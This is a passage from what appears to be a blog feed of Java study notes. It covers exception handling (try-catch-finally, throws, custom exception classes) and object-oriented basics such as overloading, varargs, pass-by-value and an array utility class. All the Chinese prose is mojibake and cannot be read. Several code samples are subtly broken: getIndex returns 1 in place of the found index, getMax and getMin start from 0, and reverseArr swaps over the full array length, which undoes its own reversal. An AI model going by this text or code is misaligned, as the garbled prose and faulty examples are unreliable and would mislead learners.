ï¼Œå³ä½¿catchä¸­åˆå‡ºç°å¼‚å¸¸äº†ï¼Œtryä¸­æœ‰returnè¯­å¥ï¼Œcatchä¸­æœ‰returnè¯­å¥ç­‰æƒ…å†µã€‚ 8.åƒæ•°æ®åº“è¿æ¥ã€è¾“å…¥è¾“å‡ºæµã€ç½‘ç»œç¼–ç¨‹Socketç­‰èµ„æºï¼ŒJVMNæ˜¯ä¸èƒ½è‡ªåŠ¨çš„å›æ”¶çš„ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±æ‰‹åŠ¨çš„è¿›è¡Œèµ„æºçš„ é‡Šæ”¾ã€‚æ­¤æ—¶çš„èµ„æºé‡Šæ”¾ï¼Œå°±éœ€è¦å£°æ˜åœ¨finallyä¸­ã€‚ 9. try-catchå¯ä»¥ç›¸äº’åµŒå¥— 10.å¼€å‘ä¸­ï¼Œç”±äºè¿è¡Œæ—¶å¼‚å¸¸æ¯”è¾ƒå¸¸è§ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šå¸¸å°±ä¸é’ˆå¯¹è¿è¡Œæ—¶å¼‚å¸¸ç¼–å†™try-catch-finallyé’ˆå¯¹äºç¼–è¯‘æ—¶å¼‚å¸¸ï¼Œæˆ‘ä»¬è¯´ä¸€å®šè¦è€ƒè™‘å¼‚å¸¸çš„å¤„ç†ã€‚ è¿è¡Œæ—¶å¼‚å¸¸ä¸ä¸€å®šéè¦try-catchï¼Œä½†ç¼–è¯‘æ—¶å¼‚å¸¸ä¸€å®šè¦åŠ  */ import org.junit.Test; import org.junit.internal.runners.statements.ExpectException; import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; import java.util.Date; import java.util.Scanner; public class ExceptionTest { // Error @Test public void testError() { // testError(); //æ ˆæº¢å‡º // Integer[] arr = new Integer[1024*1024*1024]; //OOM å †ç©ºé—´æº¢å‡º } @Test public void testException() { String a; try{ a = "123"; System.out.println(a.charAt(6)); // java.lang.StringIndexOutOfBoundsException }catch (StringIndexOutOfBoundsException e){ // System.out.println("å‡ºç°äº†StringIndexOutOfBoundsExceptionå¼‚å¸¸"); System.out.println(e.getMessage()); // e.printStackTrace(); }catch (Exception e2){ System.out.println("å‡ºç°äº†å…¶ä»–å¼‚å¸¸2"); }finally { System.out.println("finallyç»§ç»­æ‰§è¡Œå…¶ä»–è¯­å¥"); } } @Test public void testException2() { // Object obj = new Date(); // String str = (String) obj; // java.lang.ClassCastException // Scanner scanner = new Scanner(System.in); // int score = scanner.nextInt(); // System.out.println(score); // scanner.close(); // int a = 10; // int b = 0; // System.out.println(a/b); // java.lang.ArithmeticException: } @Test public void testTryCatch() { FileInputStream fis = null; try { File file = new File("test.txt"); fis = new FileInputStream(file); int data = fis.read(); while (data != -1){ System.out.println((char)data); data = fis.read(); } }catch (FileNotFoundException e){ e.getMessage(); }catch (IOException e){ e.getMessage(); }catch (Exception e){ e.getMessage(); }finally { try{ // try-catchå¯ä»¥ç›¸äº’åµŒå¥— if(fis != null) //é¿å…ç©ºæŒ‡é’ˆå¼‚å¸¸ fis.close(); //è¿æ¥ä¸ä¼šè‡ªåŠ¨é‡Šæ”¾ }catch (Exception e){ e.getMessage(); } System.out.println("finally"); } } } å¼‚å¸¸å¤„ç†2ï¼šthrows + å¼‚å¸¸ç±»å‹package cn.xpshuai.day12; /* 1. "throws + å¼‚å¸¸ç±»å‹"å†™åœ¨æ–¹æ³•çš„å£°æ˜å¤„ã€‚æŒ‡æ˜æ­¤æ–¹æ³•æ‰§è¡Œæ—¶ï¼Œå¯èƒ½ä¼šæŠ›å‡ºçš„å¼‚å¸¸ç±»å‹ã€‚ ä¸€æ—¦å½“æ–¹æ³•ä½“æ‰§è¡Œæ—¶ï¼Œå‡ºç°å¼‚å¸¸ï¼Œä»ä¼šåœ¨å¼‚å¸¸ä»£ç å¤„ç”Ÿæˆä¸€ä¸ªå¼‚å¸¸ç±»çš„å¯¹è±¡ï¼Œæ­¤å¯¹è±¡æ»¡è¶³throwsåå¼‚å¸¸ç±»å‹æ—¶,å°±ä¼šè¢«æŠ›å‡ºã€‚å¼‚å¸¸ä»£ç åç»­çš„ä»£ç ,å°±ä¸å†æ‰§è¡Œ! 2ï¼ä½“ä¼š:try-catch-finally:çœŸæ­£çš„å°†å¼‚å¸¸ç»™å¤„ç†æ‰äº†ã€‚ throwsçš„æ–¹å¼åªæ˜¯å°†å¼‚å¸¸æŠ›ç»™äº†æ–¹æ³•çš„è°ƒç”¨è€…ã€‚å¹¶è®¾æœ‰çœŸæ­£å°†å¼‚å¸¸å¤„ç†æ‰ã€‚ 3.å­ç±»æŠ›å‡ºçš„å¼‚å¸¸ä¸èƒ½å¤§äºçˆ¶ç±»çš„ å­ç±»é‡å†™çš„æ–¹æ³•æŠ›å‡ºçš„å¼‚å¸¸ç±»å‹ä¸å¤§äºçˆ¶ç±»è¢«é‡å†™çš„æ–¹æ³•æŠ›å‡ºçš„å¼‚å¸¸ç±»å‹ 4.å¼€å‘ä¸­å¦‚ä½•é€‰æ‹©ä½¿ç”¨try-catch-finally è¿˜æ˜¯ä½¿ç”¨throws? 4.1 å¦‚æœçˆ¶ç±»ä¸­è¢«é‡å†™çš„æ–¹æ³•æ²¡æœ‰throwsæ–¹å¼å¤„ç†å¼‚å¸¸ï¼Œåˆ™å­ç±»é‡å†™çš„æ–¹æ³•ä¹Ÿä¸èƒ½ä½¿ç”¨throwsï¼Œæ„å‘³ç€å¦‚æœ å­ç±»é‡å†™çš„æ–¹æ³•ä¸­æœ‰å¼‚å¸¸ï¼Œå¿…é¡»ä½¿ç”¨try-catch-finallyæ–¹å¼å¤„ç†ã€‚ 4.2 æ‰§è¡Œçš„æ–¹æ³•aä¸­ï¼Œå…ˆååˆè°ƒç”¨äº†å¦å¤–çš„å‡ ä¸ªæ–¹æ³•ï¼Œè¿™å‡ ä¸ªæ–¹æ³•æ˜¯é€’è¿›å…³ç³»æ‰§è¡Œçš„ã€‚æˆ‘ä»¬å»ºè®®è¿™å‡ ä¸ªæ–¹æ³•ä½¿ç”¨throwçš„æ–¹å¼è¿›è¡Œå¤„ç†ã€‚è€Œæ‰§è¡Œçš„æ–¹æ³•aå¯ä»¥è€ƒè™‘ä½¿ç”¨try-catch-finallyæ–¹å¼è¿›è¡Œå¤„ç†ã€‚| */ import org.junit.Test; import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; public class ThrowsTest { public static void main(String[] args) { try{ method2(); }catch (Exception e){ e.getMessage(); } } // å‘ä¸Šé€šæŠ¥ï¼ŒæŠ›ç»™ä¸Šé¢ // @Test public static void method1() throws FileNotFoundException, IOException { File file = new File("test1.txt"); FileInputStream fis = new FileInputStream(file); int data = fis.read(); while (data != -1) { System.out.println((char) data); data = fis.read(); } } // è¿™é‡Œè°ƒç”¨method1äº†ï¼Œæ‰€ä»¥method1çš„å¼‚å¸¸å°±æŠ›åˆ°method2äº† public static void method2() throws FileNotFoundException, IOException{ method1(); // method2å¤„ç†ä¸äº†ï¼Œä¹Ÿå¾€ä¸ŠæŠ› } } æ‰‹åŠ¨æŠ›å‡ºå¼‚å¸¸ï¼šthrowclass Student{ private int id; public void register(int id) throws Exception{ if (id >0){ this.id = id; }else{ //æ‰‹åŠ¨æŠ›å‡ºå¼‚å¸¸å¯¹è±¡ throw new Exception("è¾“å…¥æ•°æ®éæ³•"); //ç¼–è¯‘å’Œè¿è¡Œæ—¶éƒ½æœ‰äº†ï¼Œthrowsç»™ä¸Šå±‚å¤„ç† // throw new RuntimeException("è¾“å…¥æ•°æ®éæ³•ï¼"); // è¿è¡Œæ—¶å¼‚å¸¸ } } } ç”¨æˆ·è‡ªå®šä¹‰å¼‚å¸¸ç±»/* ç”¨æˆ·è‡ªå®šä¹‰å¼‚å¸¸ç±» 1.ç»§æ‰¿ç°æœ‰å¼‚å¸¸ç»“æ„ï¼šRuntimeException . Exception 2.æä¾›å…¨å±€å¸¸é‡ï¼šserialVersionUID 3.æä¾›é‡è½½çš„æ„é€ å™¨ */ public class SelfMakeExpection extends Exception{ static final long serialVersionUID = -7034897190745777777L; public SelfMakeExpection() { super(); } public SelfMakeExpection(String msg) { super(msg); } } è°ƒç”¨è‡ªå®šä¹‰å¼‚å¸¸ç±»ï¼š class Student{ private int id; public void register(int id) throws Exception{ if (id >0){ this.id = id; }else{ //æ‰‹åŠ¨æŠ›å‡ºå¼‚å¸¸å¯¹è±¡ // throw new Exception("è¾“å…¥æ•°æ®éæ³•"); //ç¼–è¯‘å’Œè¿è¡Œæ—¶éƒ½æœ‰äº†ï¼Œthrowsç»™ä¸Šå±‚å¤„ç† // throw new RuntimeException("è¾“å…¥æ•°æ®éæ³•ï¼"); // è¿è¡Œæ—¶å¼‚å¸¸ throw new SelfMakeExpection("è‡ªå®šä¹‰å¼‚å¸¸ç±»ï¼šå‡ºç°é”™è¯¯å•¦~~~"); } } } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Javaå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Javaå­¦ä¹ </tag>
        <tag>å¼‚å¸¸å¤„ç†</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaå­¦ä¹ ä¹‹é¢å‘å¯¹è±¡åˆè¯†]]></title>
    <url>%2Fposts%2F3433%2F</url>
    <content type="text"><![CDATA[é¢å‘å¯¹è±¡æ¦‚è¿°é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹å¾ï¼š å°è£…ï¼ˆEncapsulationï¼‰ ç»§æ‰¿ï¼ˆInheritanceï¼‰ å¤šæ€ï¼ˆPolymorphismï¼‰ ç±»å’Œç±»æˆå‘˜ï¼šå±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨(å‰ä¸‰ä¸ªé‡è¦)ï¼›ä»£ç å—ã€å†…éƒ¨ç±» å…¶ä»–å…³é”®å­—ï¼šthis, super, static, final, abstract, interface, package, import å±æ€§(æˆå‘˜å˜é‡)å’Œå±€éƒ¨å˜é‡ï¼š * åŒï¼š * å®šä¹‰æ ¼å¼ï¼šæ•°æ®ç±»å‹ å˜é‡å = å˜é‡å€¼ * å…ˆå£°æ˜åä½¿ç”¨ * éƒ½æœ‰å…¶ä½œç”¨åŸŸ * * å¼‚ï¼š * 1.å£°æ˜ä½ç½®ä¸åŒ * å±æ€§:ç›´æ¥å®šä¹‰åœ¨{}å†… * å±€éƒ¨å˜é‡ï¼šå£°æ˜åœ¨æ–¹æ³•å†…éƒ¨ã€æ–¹æ³•å½¢å‚ã€ä»£ç å—å†…ã€æ„é€ å™¨å½¢å‚ã€æ„é€ å™¨å†…éƒ¨çš„å˜é‡ * 2.å…³äºæƒé™ä¿®é¥°ç¬¦çš„ä¸åŒ * å±æ€§ï¼šå¯ä»¥åœ¨å£°æ˜å±æ€§æ—¶å€™ä½¿ç”¨æƒé™ä¿®é¥°ç¬¦ * å¦‚ï¼špublic privateï¼Œ ç¼ºçœï¼Œ protected * å±€éƒ¨å˜é‡ï¼šä¸èƒ½ç”¨æƒé™ä¿®é¥°ç¬¦ * 3.é»˜è®¤åˆå§‹åŒ–å€¼ * å±æ€§ï¼šç±»çš„å±æ€§ï¼Œæ ¹æ®å…¶ç±»å‹æœ‰åˆå§‹åŒ–é»˜è®¤å€¼ * å±€éƒ¨å˜é‡ï¼šæ²¡æœ‰é»˜è®¤åˆå§‹åŒ–å€¼ï¼ˆæ„å‘³ç€ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨å±€éƒ¨å˜é‡çš„æ—¶å€™ä¸€å®šè¦æ˜¾å¼èµ‹å€¼ï¼‰ * ç‰¹åˆ«çš„ï¼Œå½¢å‚åœ¨è°ƒç”¨æ—¶èµ‹å€¼å³å¯ * 4.äºŒè€…åœ¨å†…å­˜ä¸­åŠ è½½çš„ä½ç½® * å±æ€§ï¼šåŠ è½½åˆ°å †ç©ºé—´(éstatic) * å±€éƒ¨å˜é‡ï¼šåŠ è½½åˆ°æ ˆç©ºé—´ æ–¹æ³•ï¼š * å®šä¹‰æ ¼å¼ï¼š * æƒé™ä¿®é¥°ç¬¦ è¿”å›å€¼ç±»å‹ æ–¹æ³•å(å½¢å‚åˆ—è¡¨){ * æ–¹æ³•ä½“ * } * æ³¨æ„ï¼šstaticã€finalã€abstractæ¥ä¿®é¥°çš„æ–¹æ³•ï¼Œåé¢å†è®² * * 1.å››ç§æƒé™ä¿®é¥°ç¬¦ï¼špublicã€privateã€ç¼ºçœã€ protected * 2.è¿”å›å€¼ç±»å‹ï¼› * æœ‰è¿”å›å€¼ vs æ— è¿”å›å€¼(void,é€šå¸¸ä¸éœ€è¦returnï¼Œéè¦å†™çš„è¯å°±return;) * returnä¹‹åä¸å¯ä»¥è·Ÿè¯­å¥äº† ç±»çš„åŸºæœ¬ç»“æ„ï¼š package cn.xpshuai.test; public class PersonTest { public static void main(String[] args) { } } class Person{ // ã€å±æ€§ã€‘ = æˆå‘˜å˜é‡ = field = å­—æ®µã€åŸŸ String name; int age; boolean isMarried; // æ„é€ å™¨ public Person(){} public Person(String n, boolean im) { name = n; isMarried = im; } // ã€æ–¹æ³•ã€‘ = æˆå‘˜æ–¹æ³• = å‡½æ•° = method public void walk() { System.out.println("äººèµ°è·¯..."); } public String display() { return "åå­—ï¼š" + name + "å©šå¦ï¼š" + isMarried; } // ä»£ç å—(å‡ºç°çš„è¾ƒå°‘) { name = "éŸ©æ¢…æ¢…"; age = 17; isMarried = true; } // å†…éƒ¨ç±»(å‡ºç°çš„è¾ƒå°‘) class pet{ String name; float weight; } } å°ç»ƒä¹ ï¼š package cn.xpshuai.test; /* * å¯¹Stedent.javaçš„æ”¹è¿› * */ public class StudentsTest { public static void main(String[] args) { // å£°æ˜ Studentsç±»å‹çš„æ•°ç»„ Students[] stus = new Students[20]; // ç»™æ•°ç»„å…ƒç´ èµ‹å€¼ for (int i = 0; i &lt; stus.length; i++) { stus[i] = new Students(); //ç»™å¯¹è±¡å…ƒç´ çš„å±æ€§èµ‹å€¼ stus[i].num = i + 1; stus[i].state = (int)(Math.random() * (6-1+1)+1); stus[i].score = (int)(Math.random() * (100-0+1)); } // å®ä¾‹åŒ–ç±»å¯¹è±¡ StudentsTest testStu = new StudentsTest(); //è¾“å‡ºæŒ‡å®šå¹´çº§çš„å­¦ç”Ÿ testStu.searchState(stus, 3); // å†’æ³¡ä»å°åˆ°å¤§æ’åºå­¦ç”Ÿæˆç»© testStu.BubbleSort(stus); System.out.println("----------------æ’åºå®Œæˆ---------------"); // éå†è¾“å‡ºæ˜¾ç¤ºå­¦ç”Ÿä¿¡æ¯(æ’åºä¹‹åçš„) testStu.printStutent(stus); } /** éå†studentæ•°ç»„æ“ä½œçš„æ–¹æ³• * @param stus */ public void printStutent(Students[] stus) { for (int i = 0; i &lt; stus.length; i++) { System.out.println(stus[i].info()); } } /** æ‰¾æŒ‡å®šå¹´çº§çš„å­¦ç”Ÿçš„æ–¹æ³• * * @author XPS * @param stus è¦æŸ¥æ‰¾çš„æ•°ç»„ * @param sta è¦æ‰¾çš„å¹´çº§ */ public void searchState(Students[] stus, int sta) { for (int i = 0; i &lt; stus.length; i++) { if(stus[i].state == sta) { System.out.println(sta + "å¹´çº§å­¦ç”Ÿï¼š" + stus[i].info()); } } } /** * ç»™Studentsæ•°ç»„å†’æ³¡æ’åºçš„æ–¹æ³• * @param stu */ public void BubbleSort(Students[] stu) { for (int i = 0; i &lt; stu.length-1; i++) { for (int j = 0; j &lt; stu.length-1-i; j++) { if(stu[j].score > stu[j+1].score) { //äº¤æ¢çš„æ˜¯Studentå¯¹è±¡çš„é¡ºåº Students temp = stu[j]; stu[j] = stu[j+1]; stu[j+1] = temp; } } } } } class Students{ int num; // å­¦å· int state; // å¹´çº§ int score; //æˆç»© //æ˜¾ç¤ºå­¦ç”Ÿä¿¡æ¯çš„æ–¹æ³• public String info() { return "å­¦å·ï¼š" + num + "ï¼Œå¹´çº§" + state + "ï¼Œæˆç»©ï¼š" + score; } } åŒ¿åå¯¹è±¡package cn.xpshuai.testc; public class InstanceTest { public static void main(String[] args) { Phone p1 = new Phone(); System.out.println(p1); p1.sendEmail(); // åŒ¿åå¯¹è±¡ï¼ˆnewçš„å¯¹è±¡æ²¡æœ‰èµ‹å€¼ç»™å˜é‡åï¼‰ -->åªèƒ½è°ƒç”¨ä¸€æ¬¡ new Phone().sendEmail(); // æ²¡æœ‰å§å®ä¾‹åŒ–çš„å¯¹è±¡èµ‹å€¼ç»™å˜é‡ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨æ–¹æ³• new Phone().price = 1999; new Phone().showPrice(); // æ–°newçš„å¯¹è±¡ï¼Œæ˜¯å¦å¤–ä¸€ä¸ªäº†ï¼Œä¸èƒ½ç”¨ç¬¬äºŒæ¬¡äº† PhoneMall mall = new PhoneMall(); mall.show(new Phone()); // è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨åŒ¿åå¯¹è±¡è¾ƒå¤š } } class Phone{ double price; public void sendEmail() { System.out.println("å‘é‚®ä»¶"); } public void playGame() { System.out.println("æ‰“æ¸¸æˆ"); } public void showPrice() { System.out.println("ä»·æ ¼ä¸ºï¼š" + price); } } class PhoneMall{ public void show(Phone p) { p.sendEmail(); p.playGame(); } } æ–¹æ³•çš„é‡è½½(overload) åŒºåˆ†ä¸åé¢çš„é‡å†™ é‡è½½ï¼šåœ¨åŒä¸€ä¸ªç±»ä¸­ï¼Œå…è®¸å­˜åœ¨â€”ä¸ªä»¥ä¸Šçš„åŒåæ–¹æ³•ï¼Œåªè¦å®ƒä»¬çš„å‚æ•°ä¸ªæ•°æˆ–å‚æ•°ç±»å‹ä¸åŒå³å¯ã€‚ ç‰¹ç‚¹ï¼šä¸è¿”å›å€¼ç±»å‹æ— å…³ï¼Œåªçœ‹å‚æ•°åˆ—è¡¨ï¼Œä¸”å‚æ•°åˆ—è¡¨å¿…é¡»ä¸åŒ(å‚æ•°ä¸ªæ•°æˆ–å‚æ•°ç±»å‹)ã€‚è°ƒç”¨æ—¶ï¼Œæ ¹æ®æ–¹æ³•å‚æ•°åˆ—è¡¨çš„ä¸åŒæ¥åŒºåˆ«ã€‚ å¦‚ä¸‹ä¸¤ä¸ªåŒåæ–¹æ³•æ„æˆäº†é‡è½½ï¼š public class{ //å¦‚ä¸‹ä¸¤ä¸ªåŒåæ–¹æ³•æ„æˆäº†é‡è½½ //åè½¬æ•°ç»„ï¼ˆå½¢å‚æ˜¯æ•´æ•°æ•°ç»„ï¼‰ public void reverseArr(int[] arr) { for (int i = 0; i &lt; arr.length; i++) { int tmp = arr[i]; arr[i] = arr[arr.length-i-1]; arr[arr.length-i-1] = tmp; } } //åè½¬æ•°ç»„(å½¢å‚æ˜¯å­—ç¬¦æ•°ç»„) public void reverseArr(String[] arr) { for (int i = 0; i &lt; arr.length; i++) { String tmp = arr[i]; arr[i] = arr[arr.length-i-1]; arr[arr.length-i-1] = tmp; } } } å¯å˜ä¸ªæ•°çš„å½¢å‚ï¼ˆæ–°ç‰¹æ€§ï¼‰ jdk5.0æ–°å¢çš„å†…å®¹ æ ¼å¼ï¼šfunc(æ•°æ®ç±»å‹ â€¦ å‚æ•°å) å½“è°ƒç”¨å¯å˜ä¸ªæ•°å½¢å‚æ–¹æ³•æ—¶ï¼Œä¼ å…¥å‚æ•°ä¸ªæ•°å¯ä¸º 0åˆ°å¤šä¸ª å¯å˜ä¸ªæ•°å½¢å‚çš„æ–¹æ³•ä¸æœ¬ç±»ä¸­æ–¹æ³•åç›¸åŒï¼Œå½¢å‚ä¸åŒçš„æ–¹æ³•ä¹‹é—´æ„æˆé‡è½½ å¯å˜ä¸ªæ•°å½¢å‚åœ¨æ–¹æ³•çš„å½¢å‚ä¸­ï¼Œå¿…é¡»å£°æ˜åœ¨æœ«å°¾ï¼ˆå½¢å‚åˆ—è¡¨çš„æœ€åä¸€ä¸ªä½ç½®ï¼‰ å¯å˜ä¸ªæ•°å½¢å‚åœ¨æ–¹æ³•çš„å½¢å‚ä¸­,æœ€å¤šåªèƒ½å£°æ˜ä¸€ä¸ªå¯å˜å½¢å‚ã€‚ /* * ä½¿ç”¨åœºæ™¯ï¼šsqlæŸ¥è¯¢æ•°æ®æ—¶å€™ï¼Œwhereåé¢çš„æ¡ä»¶ä¸­ä¸çŸ¥é“å†™å‡ ä¸ªçš„æ—¶å€™ * */ public class ArgumentsTest { public static void main(String[] args) { ArgumentsTest a = new ArgumentsTest(); a.show(11); a.show("hello"); a.show("hello", "world"); a.show(new String[] {"AAA", "BBB", "CCC"}); } public void show(int i){ } public void show(String s){ } // æ–°ç‰¹æ€§ï¼šå¯å˜ä¸ªæ•°å½¢å‚(éƒ½èƒ½è¯†åˆ«) public void show(String ... strs){ for (int i = 0; i &lt; strs.length; i++) { System.out.println(strs[i]); //è°ƒç”¨æ–¹æ³•ä¸€æ · } } // // åœ¨jdk5.0ä¹‹å‰ï¼Œéƒ½æ˜¯ç”¨æ•°ç»„æ¥ä¼ é€’å¤šä¸ªå‚æ•°ï¼Œå’Œä¸Šé¢çš„æ˜¯ä¸å¯å…±å­˜çš„(ä¸æ„æˆé‡è½½) // public void show(String []... strs){ // // } } æ–¹æ³•å‚æ•°çš„å€¼ä¼ é€’æœºåˆ¶å…³äºå˜é‡çš„èµ‹å€¼ï¼š å¦‚æœå˜é‡æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼šæ­¤æ—¶èµ‹å€¼çš„æ˜¯å˜é‡æ‰€ä¿å­˜çš„æ•°æ®å€¼ å¦‚æœå˜é‡æ˜¯å¼•ç”¨æ•°æ®ç±»å‹ï¼šæ­¤æ—¶èµ‹å€¼çš„æ˜¯å˜é‡æ‰€æŒ‡å‘çš„åœ°å€ æ–¹æ³•å½¢å‚çš„ä¼ é€’æœºåˆ¶ï¼šã€å€¼ä¼ é€’æœºåˆ¶ã€‘ å¦‚æœå‚æ•°æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼Œæ­¤æ—¶å®å‚èµ‹ç»™å½¢å‚çš„æ˜¯å®å‚çœŸå®å­˜å‚¨çš„æ•°æ®å€¼ã€‚ å¦‚æœå‚æ•°æ˜¯å¼•ç”¨æ•°æ®ç±»å‹ï¼Œæ­¤æ—¶å®å‚èµ‹ç»™å½¢å‚çš„æ˜¯å®å‚å­˜å‚¨æ•°æ®çš„åœ°å€å€¼ã€‚ public class ValueTranslation { public static void main(String[] args) { System.out.println("*********åŸºæœ¬æ•°æ®ç±»å‹**********"); int m = 10; int n = m; System.out.println(m + "\t" + n); n = 20; System.out.println(m + "\t" + n); // nå˜äº†ä¹‹åï¼Œmæ˜¯ä¸å˜çš„ System.out.println("*********å¼•ç”¨æ•°æ®ç±»å‹**********"); Order o1 = new Order(); o1.id =1001; Order o2 = o1; System.out.println(o1.id + "\t" + o2.id); // 1002 o2.id =1002; System.out.println(o1.id + "\t" + o2.id); // o1ä¹Ÿä¸º1002ï¼ˆä¸¤ä¸ªåœ°å€å€¼ç›¸åŒï¼ŒæŒ‡å‘å †ç©ºé—´ä¸­åŒä¸€ä¸ªåŒºåŸŸï¼‰ System.out.println("*********æ–¹æ³•å½¢å‚çš„å€¼ä¼ é€’**********"); // äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼ int i = 10; int j = 20; System.out.println(i + "\t" + j); // äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼çš„æ“ä½œ ValueTranslation test = new ValueTranslation(); test.swap1(i, j); //è°ƒç”¨æ–¹æ³•ï¼Œæ²¡æ¢æˆï¼ˆæ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼Œä¼ é€’çš„å‚æ•°çš„å€¼ï¼Œåªæ˜¯åœ¨swapä½œç”¨åŸŸé‡Œé¢å‘ç”Ÿäº†äº¤æ¢ï¼‰ System.out.println(i + "\t" + j); System.out.println("*********æ–¹æ³•å½¢å‚çš„å¼•ç”¨æ•°æ®ç±»å‹ä¼ é€’**********"); Data data = new Data(); data.x = 10; data.y = 20; System.out.println(data.x + "\t" + data.y); ValueTranslation test2 = new ValueTranslation(); test2.swap2(data); //è°ƒç”¨æ–¹æ³•ï¼Œæ¢æˆäº†ï¼ˆæ˜¯å¼•ç”¨æ•°æ®ç±»å‹ï¼Œäº¤æ¢çš„æ˜¯å †ç©ºé—´çš„åœ°å€å€¼ï¼‰ System.out.println(data.x + "\t" + data.y); } public void swap1(int i, int j) { int tmp = i; i = j; j = tmp; } // å¼•ç”¨ä¼ é€’ç±»å‹ public void swap2(Data data) { int tmp = data.x; data.x = data.y; data.y = tmp; } } class Order{ int id; } class Data{ int x; int y; } ä½†æ˜¯ï¼ŒStringä½œä¸ºå¼•ç”¨æ•°æ®ç±»å‹ï¼Œæ˜¯ä¾‹å¤–çš„ï¼Œæ˜¯ä¸èƒ½äº¤æ¢æˆåŠŸçš„ï¼Œå› ä¸ºå®ƒå­˜åœ¨å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­ï¼Œä¼šæ–°é€ ä¸€ä¸ªåœ°å€ã€‚æ‰€ä»¥ï¼Œè®°ä¸‹é¢è¿™ä¸ªç»“è®ºï¼š å¦‚æœå˜é‡æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼šæ­¤æ—¶èµ‹å€¼çš„æ˜¯å˜é‡æ‰€ä¿å­˜çš„æ•°æ®å€¼ å¦‚æœå˜é‡æ˜¯å¼•ç”¨æ•°æ®ç±»å‹ï¼šæ­¤æ—¶èµ‹å€¼çš„æ˜¯å˜é‡æ‰€æŒ‡å‘çš„åœ°å€ è‡ªå®šä¹‰å°è£…Arrayutilç±»ï¼š package cn.xpshuai.testc; /* * è‡ªå®šä¹‰å°è£…æ•°ç»„çš„å·¥å…·ç±» */ public class ArayUtil { //æ±‚æ•°ç»„æœ€å¤§å€¼ public int getMax(int[] arr) { int max = 0; for (int i = 0; i &lt; arr.length; i++) { if (arr[i] > max) { max = arr[i]; } } return max; } //æ±‚æ•°ç»„æœ€å°å€¼ public int getMin(int[] arr) { int min = 0; for (int i = 0; i &lt; arr.length; i++) { if (arr[i] &lt; min) { min = arr[i]; } } return min; } //æ±‚æ•°ç»„æ€»å’Œ public int getSum(int[] arr) { int sum = 0; for (int i = 0; i &lt; arr.length; i++) { sum += arr[i]; } return sum; } //æ±‚æ•°ç»„å¹³å‡å€¼ public int getMiddle(int[] arr) { return getSum(arr) / arr.length; // æ–¹æ³•ä¸­è°ƒç”¨æ–¹æ³• } //å¦‚ä¸‹ä¸¤ä¸ªåŒåæ–¹æ³•æ„æˆäº†é‡è½½ï¼ˆè°ƒç”¨å“ªä¸ªå–å†³ä½ å‚æ•°çš„ç±»å‹ï¼‰ //åè½¬æ•°ç»„ public void reverseArr(int[] arr) { for (int i = 0; i &lt; arr.length; i++) { int tmp = arr[i]; arr[i] = arr[arr.length-i-1]; arr[arr.length-i-1] = tmp; } } //åè½¬æ•°ç»„ public void reverseArr(String[] arr) { for (int i = 0; i &lt; arr.length; i++) { String tmp = arr[i]; arr[i] = arr[arr.length-i-1]; arr[arr.length-i-1] = tmp; } } //å¤åˆ¶æ•°ç»„(åŒºåˆ«äºæ•°ç»„å˜é‡çš„èµ‹å€¼ï¼šarr1=arr) public int[] copyArr(int[] arr) { int[] arr2 = new int[arr.length]; for (int i = 0; i &lt; arr2.length; i++) { arr2[i] = arr[i]; } return arr2; } // æ•°ç»„éå† public void printArr(int[] arr) { System.out.print("{"); for (int i = 0; i &lt; arr.length; i++) { System.out.print(arr[i] + ", "); } System.out.print("}"); } // æ•°ç»„æ’åº(å†’æ³¡ä¸ºä¾‹), ä¸ç”¨return public void sortArr(int[] arr) { for (int i = 0; i &lt; arr.length-1; i++) { for (int j = 0; j &lt; arr.length-1-i; j++) { if(arr[j] > arr[j+1]) { //äº¤æ¢çš„æ˜¯Studentå¯¹è±¡çš„é¡ºåº // int temp = arr[j]; // arr[j] = arr[j+1]; // arr[j+1] = temp; // é”™è¯¯çš„ã€‚ä¸èƒ½ä¼ é€’åŸºæœ¬æ•°æ®ç±»å‹ // swap(arr[j], arr[j+1]); // æ­£ç¡®çš„ swap(arr, j, j+1); } } } } public void swap(int[] arr, int i, int j) { int tmp = arr[i]; arr[i] = arr[j]; arr[j] = tmp; } //æŸ¥æ‰¾æŒ‡å®šå…ƒç´ (è¿™é‡Œ çº¿æ€§æŸ¥æ‰¾) public int getIndex(int[] arr, int dest){ for (int i = 0; i &lt; arr.length; i++) { if(arr[i] == dest) { return 1; // è¿”å›ç´¢å¼•å€¼ } } return -1; //è¿”å›-1è¡¨ç¤ºæ²¡æ‰¾åˆ° } /// ... } ç”»å†…å­˜å›¾ 1.å†…å­˜ç»“æ„ï¼š â€‹ æ ˆï¼ˆå±€éƒ¨å˜é‡ï¼‰ å †ï¼ˆnewå‡ºæ¥çš„ç»“æ„ï¼šå¯¹è±¡ã€æ•°ç»„ï¼‰ 2.å˜é‡ï¼šæˆå‘˜å˜é‡&amp;å±€éƒ¨å˜é‡ï¼ˆæ–¹æ³•å†…ã€æ–¹æ³•å½¢å‚ã€æ„é€ å™¨å†…ã€æ„é€ å™¨å½¢å‚ã€ä»£ç å—å†…ï¼‰ 